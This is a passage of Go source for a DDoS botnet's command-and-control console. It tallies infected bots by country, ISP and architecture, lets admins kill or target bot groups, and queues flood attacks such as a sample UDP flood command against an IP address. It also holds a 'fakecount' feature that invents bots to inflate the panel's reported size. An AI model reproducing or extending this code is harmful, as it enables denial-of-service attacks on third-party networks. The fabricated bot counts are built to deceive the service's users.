					white + "Show top 5 countries" + reset)

				a.Println("  " + sColor + reset + " " +
					pColor + "--isp <name>" + reset + "        " +
					white + "Show bots from a specific ISP" + reset)

				a.Println("  " + sColor + reset + " " +
					pColor + "--isp top" + reset + "           " +
					white + "Show top 5 ISPs" + reset)

				a.Println("  " + sColor + reset + " " +
					pColor + "--arch <name>" + reset + "       " +
					white + "Show bots from a specific architecture" + reset)

				a.Println("  " + sColor + reset + " " +
					pColor + "--count" + reset + "             " +
					white + "Show total number of bots" + reset)

				continue
			}

			if subCmd == "--count" || subCmd == "-c" {
				if a.PrimaryColor == "" || a.SecondaryColor == "" {
					a.PrimaryColor, a.SecondaryColor = LoadThemeConfig(a.Theme)
				}

				pColor := HexToAnsi(a.PrimaryColor)
				white := "\x1b[97m"
				green := "\x1b[32m"
				red := "\x1b[31m"
				reset := "\x1b[0m"

				currentCount := slaves.CL.Count()

				if currentCount > a.MaxTotalBots {
					a.MaxTotalBots = currentCount
				}

				diff := currentCount - a.PreviousTotalBots

				diffStr := ""
				if diff > 0 {
					diffStr = fmt.Sprintf("%s+%d%s", green, diff, white)
				} else if diff < 0 {
					diffStr = fmt.Sprintf("%s%d%s", red, diff, white)
				} else {
					diffStr = fmt.Sprintf("%s0%s", white, white)
				}

				a.Println(
					white + "Loaded:        " + reset +
						pColor + "[" + reset +
						white + strconv.Itoa(currentCount) + reset +
						pColor + " | " + reset +
						diffStr + reset +
						pColor + " | " + reset +
						white + strconv.Itoa(a.MaxTotalBots) + reset +
						pColor + "]" + reset,
				)

				a.PreviousTotalBots = currentCount

				continue
			}

			if subCmd == "--countries" || subCmd == "--country" {
				dist := slaves.CL.DistributionCountry()
				query := ""
				top := false

				if len(args) > 2 {
					if strings.ToLower(args[2]) == "top" {
						top = true
					} else {
						query = strings.ToLower(args[2])
					}
				}

				a.Println(fmt.Sprintf("%sCountry Statistics%s:",
					pColor,
					utils.IfThenElse(query != "", " (Search: "+query+")", ""),
				))

				type entry struct {
					name  string
					count int
				}

				var sorted []entry
				for k, v := range dist {
					if query != "" && !strings.Contains(strings.ToLower(k), query) {
						continue
					}

					if v > a.MaxDistributionCountry[k] {
						a.MaxDistributionCountry[k] = v
					}

					sorted = append(sorted, entry{k, v})
				}

				sort.Slice(sorted, func(i, j int) bool {
					return sorted[i].count > sorted[j].count
				})

				limit := len(sorted)
				if top && limit > 5 {
					limit = 5
				}

				maxNameLen := 0
				maxValLen := 0
				maxPeakLen := 0
				maxDiffLen := 0

				type displayEntry struct {
					name    string
					val     int
					peak    int
					diffStr string
					diffRaw int
				}
				var displayList []displayEntry

				for i := 0; i < limit; i++ {
					k := sorted[i].name
					v := sorted[i].count
					peak := a.MaxDistributionCountry[k]
					diff := v - a.PreviousDistributionCountry[k]

					nameLen := len(k)
					if nameLen > maxNameLen {
						maxNameLen = nameLen
					}

					valStr := strconv.Itoa(v)
					if len(valStr) > maxValLen {
						maxValLen = len(valStr)
					}

					peakStr := strconv.Itoa(peak)
					if len(peakStr) > maxPeakLen {
						maxPeakLen = len(peakStr)
					}

					diffStrNoAnsi := "0"
					if diff > 0 {
						diffStrNoAnsi = fmt.Sprintf("+%d", diff)
					} else if diff < 0 {
						diffStrNoAnsi = fmt.Sprintf("%d", diff)
					}
					if len(diffStrNoAnsi) > maxDiffLen {
						maxDiffLen = len(diffStrNoAnsi)
					}

					displayList = append(displayList, displayEntry{k, v, peak, diffStrNoAnsi, diff})
				}

				for _, entry := range displayList {
					dStr := "\x1b[37m0 "
					if entry.diffRaw > 0 {
						dStr = fmt.Sprintf("%s+%d%s", green, entry.diffRaw, white)
					} else if entry.diffRaw < 0 {
						dStr = fmt.Sprintf("%s%d%s", red, entry.diffRaw, white)
					} else {
						dStr = fmt.Sprintf("%s%s%s", white, "0", white)
					}
					neededPadding := maxDiffLen - len(entry.diffStr)
					padding := strings.Repeat(" ", neededPadding)

					a.Println(fmt.Sprintf(
						"    %s- %s%-*s %s[ %s%*d %s| %s%s%s %s| %s%*d %s]",
						pColor, white, maxNameLen, entry.name,
						sColor,
						white, maxValLen, entry.val,
						sColor,
						padding, dStr, "",
						sColor,
						white, maxPeakLen, entry.peak,
						sColor,
					))
				}

				totalMatched := 0
				for _, e := range sorted {
					totalMatched += e.count
				}

				a.Println(fmt.Sprintf("%sTotal: %s%d", pColor, white, totalMatched))
				a.Println("")

				if query == "" {
					newPrev := make(map[string]int)
					for k, v := range dist {
						newPrev[k] = v
					}
					a.PreviousDistributionCountry = newPrev
				}

				continue
			}

			if subCmd == "--architecture" || subCmd == "--arch" {
				dist := slaves.CL.DistributionArch()
				query := ""
				top := false

				if len(args) > 2 {
					if strings.ToLower(args[2]) == "top" {
						top = true
					} else {
						query = strings.ToLower(args[2])
					}
				}

				a.Println(fmt.Sprintf("%sArchitecture Statistics%s:",
					pColor,
					utils.IfThenElse(query != "", " (Search: "+query+")", ""),
				))

				type entry struct {
					name  string
					count int
				}

				var sorted []entry
				for k, v := range dist {
					if query != "" && !strings.Contains(strings.ToLower(k), query) {
						continue
					}

					if v > a.MaxDistributionArch[k] {
						a.MaxDistributionArch[k] = v
					}

					sorted = append(sorted, entry{k, v})
				}

				sort.Slice(sorted, func(i, j int) bool {
					return sorted[i].count > sorted[j].count
				})

				limit := len(sorted)
				if top && limit > 10 {
					limit = 10
				}

				maxNameLen := 0
				maxValLen := 0
				maxPeakLen := 0
				maxDiffLen := 0

				type displayEntry struct {
					name    string
					val     int
					peak    int
					diffStr string
					diffRaw int
				}
				var displayList []displayEntry

				limit = len(sorted)
				if top && limit > 10 {
					limit = 10
				}

				for i := 0; i < limit; i++ {
					k := sorted[i].name
					v := sorted[i].count
					peak := a.MaxDistributionArch[k]
					diff := v - a.PreviousDistributionArch[k]

					if len(k) > maxNameLen {
						maxNameLen = len(k)
					}
					if len(strconv.Itoa(v)) > maxValLen {
						maxValLen = len(strconv.Itoa(v))
					}
					if len(strconv.Itoa(peak)) > maxPeakLen {
						maxPeakLen = len(strconv.Itoa(peak))
					}

					diffStrNoAnsi := "0"
					if diff > 0 {
						diffStrNoAnsi = fmt.Sprintf("+%d", diff)
					} else if diff < 0 {
						diffStrNoAnsi = fmt.Sprintf("%d", diff)
					}
					if len(diffStrNoAnsi) > maxDiffLen {
						maxDiffLen = len(diffStrNoAnsi)
					}

					displayList = append(displayList, displayEntry{k, v, peak, diffStrNoAnsi, diff})
				}

				for _, entry := range displayList {
					dStr := "\x1b[37m0 "
					if entry.diffRaw > 0 {
						dStr = fmt.Sprintf("%s+%d%s", green, entry.diffRaw, white)
					} else if entry.diffRaw < 0 {
						dStr = fmt.Sprintf("%s%d%s", red, entry.diffRaw, white)
					} else {
						dStr = fmt.Sprintf("%s%s%s", white, "0", white)
					}

					neededPadding := maxDiffLen - len(entry.diffStr)
					padding := strings.Repeat(" ", neededPadding)

					a.Println(fmt.Sprintf(
						"    %s- %s%-*s %s[ %s%*d %s| %s%s%s %s| %s%*d %s]",
						pColor, white, maxNameLen, entry.name,
						sColor,
						white, maxValLen, entry.val,
						sColor,
						padding, dStr, "",
						sColor,
						white, maxPeakLen, entry.peak,
						sColor,
					))
				}

				totalMatched := 0
				for _, e := range sorted {
					totalMatched += e.count
				}

				a.Println(fmt.Sprintf("%sTotal: %s%d", pColor, white, totalMatched))
				a.Println("")

				if query == "" {
					newPrev := make(map[string]int)
					for k, v := range dist {
						newPrev[k] = v
					}
					a.PreviousDistributionArch = newPrev
				}

				continue
			}

			if subCmd == "--isp" {
				dist := slaves.CL.DistributionISP()
				query := ""
				top := false

				if len(args) > 2 {
					if strings.ToLower(args[2]) == "top" {
						top = true
					} else {
						query = strings.ToLower(args[2])
					}
				}

				a.Println(fmt.Sprintf("%sISP Statistics%s:",
					pColor,
					utils.IfThenElse(query != "", " (Search: "+query+")", ""),
				))

				type entry struct {
					name  string
					count int
				}

				var sorted []entry
				for k, v := range dist {
					if query != "" && !strings.Contains(strings.ToLower(k), query) {
						continue
					}

					if v > a.MaxDistributionISP[k] {
						a.MaxDistributionISP[k] = v
					}

					sorted = append(sorted, entry{k, v})
				}

				sort.Slice(sorted, func(i, j int) bool {
					return sorted[i].count > sorted[j].count
				})

				limit := len(sorted)
				if top && limit > 10 {
					limit = 10
				}

				maxNameLen := 0
				maxValLen := 0
				maxPeakLen := 0
				maxDiffLen := 0

				type displayEntry struct {
					name    string
					val     int
					peak    int
					diffStr string
					diffRaw int
				}
				var displayList []displayEntry

				limit = len(sorted)
				if top && limit > 10 {
					limit = 10
				}

				for i := 0; i < limit; i++ {
					k := sorted[i].name
					v := sorted[i].count
					peak := a.MaxDistributionISP[k]
					diff := v - a.PreviousDistributionISP[k]

					if len(k) > maxNameLen {
						maxNameLen = len(k)
					}
					if len(strconv.Itoa(v)) > maxValLen {
						maxValLen = len(strconv.Itoa(v))
					}
					if len(strconv.Itoa(peak)) > maxPeakLen {
						maxPeakLen = len(strconv.Itoa(peak))
					}

					diffStrNoAnsi := "0"
					if diff > 0 {
						diffStrNoAnsi = fmt.Sprintf("+%d", diff)
					} else if diff < 0 {
						diffStrNoAnsi = fmt.Sprintf("%d", diff)
					}
					if len(diffStrNoAnsi) > maxDiffLen {
						maxDiffLen = len(diffStrNoAnsi)
					}

					displayList = append(displayList, displayEntry{k, v, peak, diffStrNoAnsi, diff})
				}

				for _, entry := range displayList {
					dStr := "\x1b[37m0 "
					if entry.diffRaw > 0 {
						dStr = fmt.Sprintf("%s+%d%s", green, entry.diffRaw, white)
					} else if entry.diffRaw < 0 {
						dStr = fmt.Sprintf("%s%d%s", red, entry.diffRaw, white)
					} else {
						dStr = fmt.Sprintf("%s%s%s", white, "0", white)
					}

					neededPadding := maxDiffLen - len(entry.diffStr)
					padding := strings.Repeat(" ", neededPadding)

					a.Println(fmt.Sprintf(
						"    %s- %s%-*s %s[ %s%*d %s| %s%s%s %s| %s%*d %s]",
						pColor, white, maxNameLen, entry.name,
						sColor,
						white, maxValLen, entry.val,
						sColor,
						padding, dStr, "",
						sColor,
						white, maxPeakLen, entry.peak,
						sColor,
					))
				}

				totalMatched := 0
				for _, e := range sorted {
					totalMatched += e.count
				}

				a.Println(fmt.Sprintf("%sTotal: %s%d", pColor, white, totalMatched))
				a.Println("")

				if query == "" {
					newPrev := make(map[string]int)
					for k, v := range dist {
						newPrev[k] = v
					}
					a.PreviousDistributionISP = newPrev
				}

				continue
			}

			query := ""
			if subCmd != "" && subCmd != "-s" && subCmd != "-c" && subCmd != "-a" {
				query = subCmd
			} else if len(args) > 2 && subCmd == "-s" {
				query = args[2]
			}

			currentDistribution := slaves.CL.Distribution()

			a.Println(fmt.Sprintf("%sBot Group Statistics%s:",
				pColor,
				utils.IfThenElse(query != "", " (Search: "+query+"*)", ""),
			))

			maxNameLen := 0
			maxValLen := 0
			maxPeakLen := 0
			maxDiffLen := 0

			type displayEntry struct {
				name    string
				val     int
				peak    int
				diffStr string
				diffRaw int
			}
			var displayList []displayEntry

			for k, v := range currentDistribution {
				if query != "" && !strings.HasPrefix(strings.ToLower(k), strings.ToLower(query)) {
					continue
				}

				if v > a.MaxDistribution[k] {
					a.MaxDistribution[k] = v
				}

				peak := a.MaxDistribution[k]
				diff := v - a.PreviousDistribution[k]

				if len(k) > maxNameLen {
					maxNameLen = len(k)
				}
				if len(strconv.Itoa(v)) > maxValLen {
					maxValLen = len(strconv.Itoa(v))
				}
				if len(strconv.Itoa(peak)) > maxPeakLen {
					maxPeakLen = len(strconv.Itoa(peak))
				}

				diffStrNoAnsi := "0"
				if diff > 0 {
					diffStrNoAnsi = fmt.Sprintf("+%d", diff)
				} else if diff < 0 {
					diffStrNoAnsi = fmt.Sprintf("%d", diff)
				}
				if len(diffStrNoAnsi) > maxDiffLen {
					maxDiffLen = len(diffStrNoAnsi)
				}

				displayList = append(displayList, displayEntry{k, v, peak, diffStrNoAnsi, diff})
			}

			sort.Slice(displayList, func(i, j int) bool {
				return displayList[i].val > displayList[j].val
			})

			totalMatched := 0
			for _, entry := range displayList {
				totalMatched += entry.val

				dStr := ""
				if entry.diffRaw > 0 {
					dStr = fmt.Sprintf("%s+%d%s", green, entry.diffRaw, white)
				} else if entry.diffRaw < 0 {
					dStr = fmt.Sprintf("%s%d%s", red, entry.diffRaw, white)
				} else {
					dStr = fmt.Sprintf("%s%s%s", white, "0", white)
				}

				neededPadding := maxDiffLen - len(entry.diffStr)
				padding := strings.Repeat(" ", neededPadding)

				a.Println(fmt.Sprintf(
					"    %s- %s%-*s %s[ %s%*d %s| %s%s%s %s| %s%*d %s]",
					pColor, white, maxNameLen, entry.name,
					sColor,
					white, maxValLen, entry.val,
					sColor,
					padding, dStr, "",
					sColor,
					white, maxPeakLen, entry.peak,
					sColor,
				))
			}

			a.Println(fmt.Sprintf("%sTotal: %s%d", pColor, white, totalMatched))

			if query == "" {
				newPrev := make(map[string]int)
				for k, v := range currentDistribution {
					newPrev[k] = v
				}
				a.PreviousDistribution = newPrev
			}

			continue
		}

		if strings.HasPrefix(cmd, "fakecount") {
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}

			args := strings.Fields(cmd)
			if len(args) < 2 {
				a.Println("Usage: fakecount <add|remove|reset|persist>")
				continue
			}

			subCmd := args[1]
			switch subCmd {
			case "reset":
				slaves.CL.ResetFakeBots()
				a.Println("All fake bots removed.")
			case "add":

				if len(args) < 6 {
					a.Println("Usage: fakecount add <count> <arch> <countries> <group> [-time=seconds] [-cores=count] [-ram=mb]")
					continue
				}
				count, _ := strconv.Atoi(args[2])
				arch := args[3]

				rawCountries := strings.Split(args[4], ",")
				var countries []string
				for _, c := range rawCountries {
					countries = append(countries, utils.NormalizeCountryName(c))
				}

				group := args[5]

				durationSeconds := 0
				cores := 1
				ram := 1024
				for _, arg := range args[6:] {
					if strings.HasPrefix(arg, "-time=") {
						val := strings.TrimPrefix(arg, "-time=")
						durationSeconds, _ = strconv.Atoi(val)
					} else if strings.HasPrefix(arg, "-cores=") {
						val := strings.TrimPrefix(arg, "-cores=")
						cores, _ = strconv.Atoi(val)
					} else if strings.HasPrefix(arg, "-ram=") {
						val := strings.TrimPrefix(arg, "-ram=")
						ram, _ = strconv.Atoi(val)
					}
				}

				slaves.CL.AddFakeBotsStaggered(count, arch, countries, group, durationSeconds, cores, ram)

				msg := fmt.Sprintf("Added %d fake bots (%d cores, %dMB RAM) to group %s", count, cores, ram, group)
				if durationSeconds > 0 {
					msg += fmt.Sprintf(" gradually over %ds", durationSeconds)
				}
				a.Println(msg)
			case "remove":
				if len(args) < 3 {
					a.Println("Usage: fakecount remove <group>")
					continue
				}
				group := args[2]
				slaves.CL.RemoveFakeGroup(group)
				a.Printf("Removed all fake bots from group %s\n", group)
			case "persist":

				minS, maxS, minB, maxB := 1, 5, 1, 10

				if len(args) >= 3 {
					secRange := strings.Split(args[2], "-")
					if len(secRange) == 2 {
						minS, _ = strconv.Atoi(secRange[0])
						maxS, _ = strconv.Atoi(secRange[1])
					}
				}

				if len(args) >= 4 {
					botRange := strings.Split(args[3], "-")
					if len(botRange) == 2 {
						minB, _ = strconv.Atoi(botRange[0])
						maxB, _ = strconv.Atoi(botRange[1])
					}
				}

				slaves.CL.StartPersist(minS, maxS, minB, maxB)
				a.Printf("Persist started: %d-%ds interval, %d-%dbots fluctuation\n", minS, maxS, minB, maxB)
			default:
				continue
			}
			continue
		}

		if cmd[0] == '@' {
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
			}

			cataSplit := strings.SplitN(cmd, " ", 2)

			if len(cataSplit) > 1 {
				botCat = cataSplit[0][1:]
				cmd = cataSplit[1]
			} else {
				a.Println("Usage: @<group> <command>")
				a.Println("Example: @x86_64 udpplain 70.70.70.72 30 dport=80 size=1400")
				continue
			}
		}

		if strings.HasPrefix(cmd, "!kill ") {
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}

			botgroup := strings.TrimPrefix(cmd, "!kill ")
			if botgroup == "*" {
				botgroup = ""
			}

			slaves.CL.QueueKill(botgroup)
			a.Println("Terminating bots...")
			continue
		}

		botCount = a.Session.Account.Bots
		isAdmin := 0
		if a.Session.Account.Admin {
			isAdmin = 1
		}

		atk, err := attacks.NewAttack(cmd, isAdmin, a.Session.Username)
		if err != nil {
			if err.Error() != "" {
				a.Println(err.Error())
			}
		} else {
			buf, err := atk.Build()
			if err != nil {
				a.Println(err.Error())
			} else {

				actualBotCount := botCount
				if atk.BotCount >= 0 {
					actualBotCount = atk.BotCount
				}

				if can, err := database.DatabaseConnection.CanLaunchAttack(a.Session.Username, atk.Duration, cmd, actualBotCount, 0); !can {
					a.Println(err.Error())
				} else {
					err = database.DatabaseConnection.IncreaseTotalAttacks(a.Session.Username)
					if err != nil {
						fmt.Println(err)
					}
					a.Session.Account.TotalAttacks++

					startChan, waitTime, pos, total, err := attacks.GlobalQueue.Submit(atk, a.Session.Username, botCat, buf)
					if err != nil {
						a.Println("\x1b[31m" + err.Error() + "\x1b[0m")
						continue
					}

					if pos > 0 {
						numOngoing := database.DatabaseConnection.NumOngoing()
						if numOngoing < attacks.MaxGlobalSlots && pos == 1 {

							<-startChan
							err = Displayln(a, "assets/branding/attacks/attack_sent.txt", a.Session.Username, actualBotCount)
							if err != nil {
								a.Println(fmt.Sprintf("Broadcasted to %d bots.", actualBotCount))
							}
						} else {

							queuedMsg := config.Config.Queue.QueuedMessage
							if queuedMsg == "" {
								queuedMsg = "Successfully <<$primary>>queued<<$reset>> command, will be <<$primary>>broadcasted<<$reset>> very shortly! Position [<<$primary>><<$pos>><<$reset>>/<<$primary>><<$total>><<$reset>>]"
							}

							queueBranding := getBrandingMap(a, a.Session.Username)
							queueBranding["<<$pos>>"] = strconv.Itoa(pos)
							queueBranding["<<$total>>"] = strconv.Itoa(total)
							queueBranding["<<$waittime>>"] = strconv.Itoa(waitTime)

							finalQueuedMsg := utils.ReplaceFromMap(queuedMsg, queueBranding)
							a.Println(finalQueuedMsg)

							go func(sChan chan bool, admin *Admin, bCount int) {

								<-sChan

								broadcastMsg := config.Config.Queue.BroadcastMessage
								if broadcastMsg == "" {
									broadcastMsg = "Attack has been <<$primary>>broadcasted<<$reset>> to <<$primary>><<$botcount>><<$reset>> bots!"
								}

								broadcastBranding := getBrandingMap(admin, admin.Session.Username, bCount)
								finalBroadcastMsg := utils.ReplaceFromMap(broadcastMsg, broadcastBranding)

								admin.Printf("\r\n%s\r\n", finalBroadcastMsg)

								prompt, _ := DisplayPrompt(admin)
								admin.Printf("%s", prompt)
							}(startChan, a, actualBotCount)
						}
					}
				}
			}
		}
	}
}

func formatRAM(mb int) string {
	if mb > 1024 {
		gb := float64(mb) / 1024.0
		return fmt.Sprintf("\x1b[0m%.2f GB", gb)
	}
	return "\x1b[0m" + strconv.Itoa(mb) + " MB"
}
